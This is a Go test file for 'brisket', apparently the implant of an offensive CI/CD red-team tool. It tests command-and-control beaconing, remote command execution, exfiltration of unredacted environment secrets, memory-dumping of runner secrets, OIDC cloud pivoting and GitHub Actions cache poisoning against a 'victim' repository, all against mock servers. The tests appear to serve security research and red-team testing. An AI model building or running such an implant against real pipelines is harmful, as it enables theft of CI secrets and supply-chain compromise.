// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func TestNew_CreatesAgent(t *testing.T) {
	config := DefaultConfig()
	agent := New(config)

	assert.NotNil(t, agent)
	assert.NotEmpty(t, agent.AgentID())
	assert.Contains(t, agent.AgentID(), "brisket-")
}

func TestAgentID_ReturnsID(t *testing.T) {
	agent := New(DefaultConfig())

	id := agent.AgentID()
	assert.NotEmpty(t, id)
	assert.Contains(t, id, "brisket-")

	// ID should be stable
	assert.Equal(t, id, agent.AgentID())
}

func TestDefaultConfig_Values(t *testing.T) {
	config := DefaultConfig()

	assert.Equal(t, "http://localhost:8080", config.KitchenURL)
	assert.Empty(t, config.SessionID)
	assert.NotZero(t, config.BeaconInterval)
	assert.NotZero(t, config.HTTPTimeout)
}

func TestGatherEnvironment_ReturnsValidJSON(t *testing.T) {
	agent := New(DefaultConfig())

	data := agent.gatherEnvironment()
	require.NotEmpty(t, data)

	var env map[string]any
	err := json.Unmarshal(data, &env)
	require.NoError(t, err)

	assert.Equal(t, agent.AgentID(), env["agent_id"])
	assert.Equal(t, runtime.GOOS, env["os"])
	assert.Equal(t, runtime.GOARCH, env["arch"])
	assert.NotNil(t, env["pid"])
	assert.NotNil(t, env["cwd"])
	assert.NotNil(t, env["env"])
	assert.NotNil(t, env["timestamp"])
}

func TestExecuteOrderInner_OIDCPivotFailureReturnsStructuredResult(t *testing.T) {
	t.Setenv("GITHUB_ACTIONS", "")
	t.Setenv("GITLAB_CI", "")
	t.Setenv("TF_BUILD", "")
	t.Setenv("CIRCLECI", "")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", "")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
	t.Setenv("CI_JOB_JWT", "")
	t.Setenv("CI_JOB_JWT_V2", "")
	t.Setenv("SYSTEM_OIDCREQUESTURI", "")
	t.Setenv("SYSTEM_ACCESSTOKEN", "")
	t.Setenv("SYSTEM_SERVICECONNECTIONID", "")
	t.Setenv("CIRCLE_OIDC_TOKEN", "")
	t.Setenv("CIRCLE_OIDC_TOKEN_V2", "")

	agent := New(DefaultConfig())
	order := models.NewOrder("session-1", agent.AgentID(), "oidc", []string{"pivot", "gcp"})
	coleslaw := models.NewColeslaw(order.OrderID, order.SessionID, order.AgentID)

	agent.executeOrderInner(context.Background(), order, coleslaw)

	assert.Equal(t, 1, coleslaw.ExitCode)
	assert.Empty(t, coleslaw.Error)

	stdout, err := coleslaw.GetStdout()
	require.NoError(t, err)
	require.NotEmpty(t, stdout)

	var result models.PivotResult
	require.NoError(t, json.Unmarshal(stdout, &result))
	assert.Equal(t, "gcp", result.Provider)
	assert.False(t, result.Success)
	assert.NotEmpty(t, result.Errors)
}

func TestGetCwd_ReturnsCurrentDir(t *testing.T) {
	cwd := getCwd()

	// Should return a valid path, not "unknown"
	expected, err := os.Getwd()
	require.NoError(t, err)
	assert.Equal(t, expected, cwd)
}

func TestGetHostname_ReturnsHostname(t *testing.T) {
	hostname := getHostname()

	expected, err := os.Hostname()
	if err != nil {
		assert.Equal(t, "unknown", hostname)
	} else {
		assert.Equal(t, expected, hostname)
	}
}

func TestGetFilteredEnv_CapturesSecrets(t *testing.T) {
	// Set test secrets - these should NOT be redacted for exfiltration
	t.Setenv("TEST_SECRET_KEY", "super-secret-value")
	t.Setenv("TEST_PASSWORD", "my-password")
	t.Setenv("TEST_NORMAL_VAR", "normal-value")

	env := getFilteredEnv()

	// All vars including secrets should be present with full values
	assert.Equal(t, "normal-value", env["TEST_NORMAL_VAR"])
	assert.Equal(t, "super-secret-value", env["TEST_SECRET_KEY"])
	assert.Equal(t, "my-password", env["TEST_PASSWORD"])
}

func TestGetFilteredEnv_ShowsEmptySensitiveValues(t *testing.T) {
	// Set an empty secret
	t.Setenv("EMPTY_TOKEN", "")

	env := getFilteredEnv()

	// Empty sensitive values are not redacted (nothing to hide)
	assert.Equal(t, "", env["EMPTY_TOKEN"])
}

func TestGenerateAgentID_UniqueIDs(t *testing.T) {
	ids := make(map[string]bool)

	for i := 0; i < 100; i++ {
		id := generateAgentID()
		assert.NotEmpty(t, id)
		assert.Contains(t, id, "brisket-")
		assert.False(t, ids[id], "Duplicate ID generated: %s", id)
		ids[id] = true
	}
}

// =============================================================================
// HTTP Communication Tests (Beacon, Poll, SendData)
// =============================================================================

func TestBeacon_SendsCorrectPayload(t *testing.T) {
	var receivedBody []byte
	var receivedPath string

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		receivedPath = req.URL.Path
		receivedBody, _ = io.ReadAll(req.Body)
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{
		KitchenURL:  "http://test.local",
		SessionID:   "test-session",
		HTTPTimeout: 5 * time.Second,
		HTTPClient:  client,
	}
	agent := New(config)

	err := agent.beacon(context.Background())

	require.NoError(t, err)
	assert.Equal(t, "/b/"+agent.AgentID(), receivedPath)

	var payload map[string]any
	require.NoError(t, json.Unmarshal(receivedBody, &payload))
	assert.Equal(t, agent.AgentID(), payload["agent_id"])
	assert.Equal(t, "test-session", payload["session_id"])
	assert.NotEmpty(t, payload["hostname"])
	assert.NotEmpty(t, payload["os"])
	assert.NotEmpty(t, payload["arch"])
}

func TestBeacon_FailsOnServerError(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return jsonResponse(http.StatusInternalServerError, "server error"), nil
	})

	config := Config{
		KitchenURL:  "http://test.local",
		HTTPTimeout: 5 * time.Second,
		HTTPClient:  client,
	}
	agent := New(config)

	err := agent.beacon(context.Background())

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "500")
}

func TestBeacon_FailsOnUnreachableServer(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return nil, fmt.Errorf("connection refused")
	})

	config := Config{
		KitchenURL:  "http://test.local",
		HTTPTimeout: 100 * time.Millisecond,
		HTTPClient:  client,
	}
	agent := New(config)

	err := agent.beacon(context.Background())

	assert.Error(t, err)
}

func TestPoll_Returns204NoContent(t *testing.T) {
	var receivedMethod string

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		receivedMethod = req.Method
		return emptyResponse(http.StatusNoContent), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	orders, err := agent.poll(context.Background())

	require.NoError(t, err)
	assert.Nil(t, orders)
	assert.Equal(t, http.MethodGet, receivedMethod)
}

func TestPoll_ReturnsOrder(t *testing.T) {
	order := models.NewOrder("session", "agent", "exec", []string{"whoami"})
	orderJSON, _ := json.Marshal(order)

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return jsonResponse(http.StatusOK, string(orderJSON)), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	orders, err := agent.poll(context.Background())

	require.NoError(t, err)
	require.Len(t, orders, 1)
	assert.Equal(t, order.OrderID, orders[0].OrderID)
	assert.Equal(t, "exec", orders[0].Command)
	assert.Equal(t, []string{"whoami"}, orders[0].Args)
}

func TestRun_StopsAfterMaxOffline(t *testing.T) {
	var attempts atomic.Int32

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		attempts.Add(1)
		return nil, fmt.Errorf("connection refused")
	})

	agent := New(Config{
		KitchenURL:     "http://test.local",
		HTTPTimeout:    25 * time.Millisecond,
		HTTPClient:     client,
		BeaconInterval: 20 * time.Millisecond,
		MaxOffline:     70 * time.Millisecond,
	})

	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancel()

	start := time.Now()
	err := agent.Run(ctx)

	require.NoError(t, err)
	assert.Less(t, time.Since(start), 500*time.Millisecond)
	assert.GreaterOrEqual(t, attempts.Load(), int32(2))
}

func TestPoll_FailsOnBadJSON(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return jsonResponse(http.StatusOK, "{invalid json}"), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	orders, err := agent.poll(context.Background())

	assert.Error(t, err)
	assert.Nil(t, orders)
}

func TestPoll_FailsOnServerError(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return emptyResponse(http.StatusInternalServerError), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	orders, err := agent.poll(context.Background())

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "500")
	assert.Nil(t, orders)
}

func TestSendData_SendsToCorrectEndpoint(t *testing.T) {
	var receivedBody []byte
	var receivedPath string
	var receivedContentType string

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		receivedPath = req.URL.Path
		receivedContentType = req.Header.Get("Content-Type")
		receivedBody, _ = io.ReadAll(req.Body)
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	testData := []byte(`{"test": "data"}`)
	err := agent.sendData(context.Background(), testData)

	require.NoError(t, err)
	assert.Equal(t, "/b/"+agent.AgentID(), receivedPath)
	assert.Equal(t, "application/json", receivedContentType)
	assert.Equal(t, testData, receivedBody)
}

// =============================================================================
// ExecuteOrder Tests
// =============================================================================

func TestExecuteOrder_ExecCommand(t *testing.T) {
	var receivedBody []byte

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			receivedBody, _ = io.ReadAll(req.Body)
		}
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	order := models.NewOrder("session", agent.AgentID(), "exec", []string{"echo", "hello"})
	agent.executeOrder(context.Background(), order)

	require.NotEmpty(t, receivedBody)

	var coleslaw models.Coleslaw
	require.NoError(t, json.Unmarshal(receivedBody, &coleslaw))
	assert.Equal(t, order.OrderID, coleslaw.OrderID)
}

func TestExecuteOrder_UnknownCommand(t *testing.T) {
	var receivedBody []byte

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			receivedBody, _ = io.ReadAll(req.Body)
		}
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	order := models.NewOrder("session", agent.AgentID(), "unknown_cmd", nil)
	agent.executeOrder(context.Background(), order)

	require.NotEmpty(t, receivedBody)

	var coleslaw models.Coleslaw
	require.NoError(t, json.Unmarshal(receivedBody, &coleslaw))
	assert.Equal(t, order.OrderID, coleslaw.OrderID)
	assert.NotZero(t, coleslaw.ExitCode)
}

func TestExecuteOrder_EnvCommand(t *testing.T) {
	var receivedBody []byte

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			receivedBody, _ = io.ReadAll(req.Body)
		}
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	order := models.NewOrder("session", agent.AgentID(), "env", nil)
	agent.executeOrder(context.Background(), order)

	require.NotEmpty(t, receivedBody)

	var coleslaw models.Coleslaw
	require.NoError(t, json.Unmarshal(receivedBody, &coleslaw))
	assert.Equal(t, order.OrderID, coleslaw.OrderID)
	assert.Equal(t, 0, coleslaw.ExitCode)
}

func TestExecuteOrder_ReconCommand(t *testing.T) {
	var receivedBody []byte

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			receivedBody, _ = io.ReadAll(req.Body)
		}
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	order := models.NewOrder("session", agent.AgentID(), "recon", nil)
	agent.executeOrder(context.Background(), order)

	require.NotEmpty(t, receivedBody)

	var coleslaw models.Coleslaw
	require.NoError(t, json.Unmarshal(receivedBody, &coleslaw))
	assert.Equal(t, order.OrderID, coleslaw.OrderID)
}

// =============================================================================
// ExecCommand Tests
// =============================================================================

func TestExecCommand_RunsCommand(t *testing.T) {
	agent := New(DefaultConfig())

	stdout, stderr, exitCode := agent.execCommand(context.Background(), []string{"echo", "hello"})

	assert.Equal(t, 0, exitCode)
	assert.Contains(t, string(stdout), "hello")
	assert.Empty(t, stderr)
}

func TestExecCommand_HandlesFailure(t *testing.T) {
	agent := New(DefaultConfig())

	_, _, exitCode := agent.execCommand(context.Background(), []string{"false"})

	assert.NotEqual(t, 0, exitCode)
}

func TestExecCommand_NoCommand(t *testing.T) {
	agent := New(DefaultConfig())

	stdout, stderr, exitCode := agent.execCommand(context.Background(), []string{})

	assert.Equal(t, 1, exitCode)
	assert.Nil(t, stdout)
	assert.NotEmpty(t, stderr)
}

func TestExecCommand_RespectsContext(t *testing.T) {
	agent := New(DefaultConfig())

	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	// Sleep command should be interrupted
	_, _, exitCode := agent.execCommand(ctx, []string{"sleep", "10"})

	// Should fail due to context cancellation
	assert.NotEqual(t, 0, exitCode)
}

// =============================================================================
// Run Loop Tests
// =============================================================================

func TestRun_StopsOnContextCancel(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{
		KitchenURL:     "http://test.local",
		BeaconInterval: 50 * time.Millisecond,
		HTTPTimeout:    5 * time.Second,
		HTTPClient:     client,
	}
	agent := New(config)

	ctx, cancel := context.WithTimeout(context.Background(), 150*time.Millisecond)
	defer cancel()

	err := agent.Run(ctx)

	assert.ErrorIs(t, err, context.DeadlineExceeded)
}

func TestRun_ExecutesOrders(t *testing.T) {
	var beaconCount int32
	var pollCount int32
	orderSent := false

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			atomic.AddInt32(&beaconCount, 1)
			return emptyResponse(http.StatusOK), nil
		}
		if req.Method == http.MethodGet {
			count := atomic.AddInt32(&pollCount, 1)
			if count == 1 && !orderSent {
				orderSent = true
				order := models.NewOrder("session", "agent", "exec", []string{"echo", "test"})
				orderJSON, _ := json.Marshal(order)
				return jsonResponse(http.StatusOK, string(orderJSON)), nil
			}
			return emptyResponse(http.StatusNoContent), nil
		}
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{
		KitchenURL:     "http://test.local",
		BeaconInterval: 50 * time.Millisecond,
		HTTPTimeout:    5 * time.Second,
		HTTPClient:     client,
	}
	agent := New(config)

	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()

	_ = agent.Run(ctx)

	assert.GreaterOrEqual(t, atomic.LoadInt32(&beaconCount), int32(1))
	assert.GreaterOrEqual(t, atomic.LoadInt32(&pollCount), int32(1))
}

// =============================================================================
// RunOnce (Express Mode) Tests
// =============================================================================

func TestRunOnce_SendsEnvironmentData(t *testing.T) {
	var receivedBody []byte

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		receivedBody, _ = io.ReadAll(req.Body)
		return emptyResponse(http.StatusOK), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	err := agent.RunOnce(context.Background())

	require.NoError(t, err)
	require.NotEmpty(t, receivedBody)

	var data map[string]any
	require.NoError(t, json.Unmarshal(receivedBody, &data))
	assert.NotEmpty(t, data["agent_id"])
	assert.NotEmpty(t, data["hostname"])
}

func TestRunOnce_FailsOnServerError(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return emptyResponse(http.StatusInternalServerError), nil
	})

	config := Config{KitchenURL: "http://test.local", HTTPTimeout: 5 * time.Second, HTTPClient: client}
	agent := New(config)

	err := agent.RunOnce(context.Background())

	assert.Error(t, err)
}

func TestEmitLogMarkers_IncludesExecAndUpload(t *testing.T) {
	agent := New(Config{CallbackID: "stg_sm_test"})
	callbackHash := markerHash("stg_sm_test")
	agentHash := markerHash(agent.agentID)

	output := captureStdout(t, func() {
		agent.emitLogMarkers([]byte(`{"callback_id":"stg_sm_test","memdump_attempted":true,"memdump_error":"","memdump_count":3,"runner_vars":["A=1"],"runner_endpoints":[{"env_name":"ACTIONS_RESULTS_URL","value":"https://results.example"}]}`))
	})

	assert.Contains(t, output, "smokedmeat.exec.v1 callback_hash="+callbackHash+" agent_hash="+agentHash+" memdump=3 vars=1 endpoints=1")
	assert.Contains(t, output, "smokedmeat.upload.v1 callback_hash="+callbackHash+" agent_hash="+agentHash)
	assert.NotContains(t, output, "callback=stg_sm_test")
	assert.NotContains(t, output, "agent="+agent.agentID)
}

func TestRunOnce_EmitsUploadMarkerOnSuccessfulSend(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return emptyResponse(http.StatusOK), nil
	})

	agent := New(Config{
		KitchenURL:  "http://test.local",
		HTTPTimeout: 5 * time.Second,
		HTTPClient:  client,
		CallbackID:  "stg_sm_test",
	})
	callbackHash := markerHash("stg_sm_test")
	agentHash := markerHash(agent.agentID)

	output := captureStdout(t, func() {
		err := agent.RunOnce(context.Background())
		require.NoError(t, err)
	})

	assert.Contains(t, output, "smokedmeat.upload.v1 callback_hash="+callbackHash+" agent_hash="+agentHash)
	assert.NotContains(t, output, "callback=stg_sm_test")
	assert.NotContains(t, output, "agent="+agent.agentID)
}

func TestRunOnce_DoesNotEmitMarkersWhenSendFails(t *testing.T) {
	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		return emptyResponse(http.StatusInternalServerError), nil
	})

	agent := New(Config{
		KitchenURL:  "http://test.local",
		HTTPTimeout: 5 * time.Second,
		HTTPClient:  client,
		CallbackID:  "stg_sm_test",
	})

	output := captureStdout(t, func() {
		err := agent.RunOnce(context.Background())
		require.Error(t, err)
	})

	assert.NotContains(t, output, "smokedmeat.upload.v1")
	assert.NotContains(t, output, "smokedmeat.exec.v1")
}

func TestRunOnce_ArmsCachePoisonBeforeSendingEnvironmentData(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "build-cache"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(root, "build-cache", "seed.txt"), []byte("seed"), 0o644))

	var mu sync.Mutex
	var events []string
	record := func(event string) {
		mu.Lock()
		defer mu.Unlock()
		events = append(events, event)
	}

	cacheMux := http.NewServeMux()
	var cacheSrv *httptest.Server
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		record("cache-lookup")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false})
	})
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		record("cache-create")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "signed_upload_url": cacheSrv.URL + "/upload/new-cache"})
	})
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		record("cache-finalize")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "entry_id": "1"})
	})
	cacheMux.HandleFunc("/upload/new-cache", func(w http.ResponseWriter, r *http.Request) {
		record("cache-upload")
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPut, r.Method)
		_, _ = io.Copy(io.Discard, r.Body)
		w.WriteHeader(http.StatusCreated)
	})
	cacheSrv = httptest.NewServer(cacheMux)
	defer cacheSrv.Close()

	t.Setenv("GITHUB_WORKSPACE", root)
	t.Setenv("ACTIONS_RESULTS_URL", cacheSrv.URL)
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	encoded, err := cachepoison.DeploymentConfig{
		Candidate: cachepoison.VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: cachepoison.CacheEntryPlan{
				Mode:         cachepoison.CacheEntryModePredicted,
				Strategy:     cachepoison.StrategyActionsCache,
				KeyTemplate:  "demo-key",
				PathPatterns: []string{"./build-cache"},
			},
			Execution: cachepoison.ExecutionPlan{
				Kind:       cachepoison.ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-123",
		VictimCallbackID: "cb-123",
	}.Encode()
	require.NoError(t, err)

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		record("kitchen-send")
		if req.Method == http.MethodPost {
			var payload map[string]any
			require.NoError(t, json.NewDecoder(req.Body).Decode(&payload))
			status, ok := payload["cache_poison"].(map[string]any)
			require.True(t, ok)
			assert.Equal(t, "armed", status["status"])
			assert.Equal(t, "demo-key", status["key"])
			assert.Equal(t, summarizeRuntimeValue("runtime-token"), status["runtime_token_summary"])
			assert.Equal(t, summarizeRuntimeValue(cacheSrv.URL), status["results_url_summary"])
		}
		return emptyResponse(http.StatusOK), nil
	})

	agent := New(Config{
		KitchenURL:        "http://test.local",
		HTTPTimeout:       5 * time.Second,
		HTTPClient:        client,
		CachePoisonConfig: encoded,
	})

	err = agent.RunOnce(context.Background())
	require.NoError(t, err)

	mu.Lock()
	defer mu.Unlock()
	require.NotEmpty(t, events)
	kitchenIdx := indexOfEvent(events, "kitchen-send")
	require.NotEqual(t, -1, kitchenIdx)
	assert.GreaterOrEqual(t, kitchenIdx, 3)
	assert.Equal(t, []string{"cache-lookup", "cache-create", "cache-upload", "cache-finalize"}, events[:4])
}

func TestRunOnce_UsesMemDumpRuntimeForCachePoisonWhenShellEnvHidden(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "build-cache"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(root, "build-cache", "seed.txt"), []byte("seed"), 0o644))

	var mu sync.Mutex
	var events []string
	record := func(event string) {
		mu.Lock()
		defer mu.Unlock()
		events = append(events, event)
	}

	cacheMux := http.NewServeMux()
	var cacheSrv *httptest.Server
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		record("cache-lookup")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false})
	})
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		record("cache-create")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "signed_upload_url": cacheSrv.URL + "/upload/new-cache"})
	})
	cacheMux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		record("cache-finalize")
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "entry_id": "1"})
	})
	cacheMux.HandleFunc("/upload/new-cache", func(w http.ResponseWriter, r *http.Request) {
		record("cache-upload")
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPut, r.Method)
		_, _ = io.Copy(io.Discard, r.Body)
		w.WriteHeader(http.StatusCreated)
	})
	cacheSrv = httptest.NewServer(cacheMux)
	defer cacheSrv.Close()

	t.Setenv("GITHUB_WORKSPACE", root)

	encoded, err := cachepoison.DeploymentConfig{
		Candidate: cachepoison.VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: cachepoison.CacheEntryPlan{
				Mode:         cachepoison.CacheEntryModePredicted,
				Strategy:     cachepoison.StrategyActionsCache,
				KeyTemplate:  "demo-key-memdump-runtime",
				PathPatterns: []string{"./build-cache"},
			},
			Execution: cachepoison.ExecutionPlan{
				Kind:       cachepoison.ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-memdump",
		VictimCallbackID: "cb-memdump",
	}.Encode()
	require.NoError(t, err)

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		record("kitchen-send")
		if req.Method == http.MethodPost {
			var payload map[string]any
			require.NoError(t, json.NewDecoder(req.Body).Decode(&payload))
			status, ok := payload["cache_poison"].(map[string]any)
			require.True(t, ok)
			assert.Equal(t, "armed", status["status"])
			assert.Equal(t, "demo-key-memdump-runtime", status["key"])
			assert.Equal(t, "memdump", status["runtime_source"])
			assert.Equal(t, summarizeRuntimeValue("runtime-token"), status["runtime_token_summary"])
			assert.Equal(t, summarizeRuntimeValue(cacheSrv.URL), status["results_url_summary"])
		}
		return emptyResponse(http.StatusOK), nil
	})

	agent := New(Config{
		KitchenURL:        "http://test.local",
		HTTPTimeout:       5 * time.Second,
		HTTPClient:        client,
		CachePoisonConfig: encoded,
	})
	agent.dumpRunnerSecrets = func() *MemDumpResult {
		return &MemDumpResult{
			Secrets: []string{
				`"ACTIONS_RUNTIME_TOKEN"{"value":"runtime-token","isSecret":true}`,
			},
			Vars: []string{
				fmt.Sprintf(`{"k":"ACTIONS_RESULTS_URL","v":"%s"}`, cacheSrv.URL),
			},
		}
	}

	err = agent.RunOnce(context.Background())
	require.NoError(t, err)

	mu.Lock()
	defer mu.Unlock()
	require.NotEmpty(t, events)
	kitchenIdx := indexOfEvent(events, "kitchen-send")
	require.NotEqual(t, -1, kitchenIdx)
	assert.GreaterOrEqual(t, kitchenIdx, 3)
	assert.Equal(t, []string{"cache-lookup", "cache-create", "cache-upload", "cache-finalize"}, events[:4])
}

func TestRunOnce_FailsCachePoisonWhenRuntimeHidden(t *testing.T) {
	encoded, err := cachepoison.DeploymentConfig{
		Candidate: cachepoison.VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: cachepoison.CacheEntryPlan{
				Mode:         cachepoison.CacheEntryModePredicted,
				Strategy:     cachepoison.StrategyActionsCache,
				KeyTemplate:  "demo-key-hidden-runtime",
				PathPatterns: []string{"./build-cache"},
			},
			Execution: cachepoison.ExecutionPlan{
				Kind:       cachepoison.ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-hidden",
		VictimCallbackID: "cb-hidden",
	}.Encode()
	require.NoError(t, err)

	client := newMockClient(func(req *http.Request) (*http.Response, error) {
		if req.Method == http.MethodPost {
			var payload map[string]any
			require.NoError(t, json.NewDecoder(req.Body).Decode(&payload))
			status, ok := payload["cache_poison"].(map[string]any)
			require.True(t, ok)
			assert.Equal(t, "failed", status["status"])
			assert.Contains(t, status["error"], "runner memory dump failed")
		}
		return emptyResponse(http.StatusOK), nil
	})

	agent := New(Config{
		KitchenURL:        "http://test.local/base",
		HTTPTimeout:       5 * time.Second,
		HTTPClient:        client,
		CachePoisonConfig: encoded,
		CallbackID:        "stg-writer",
	})
	agent.dumpRunnerSecrets = func() *MemDumpResult {
		return &MemDumpResult{Error: "open /proc/1935/mem: permission denied"}
	}

	err = agent.RunOnce(context.Background())
	require.NoError(t, err)
}

func indexOfEvent(events []string, want string) int {
	for idx, event := range events {
		if event == want {
			return idx
		}
	}
	return -1
}
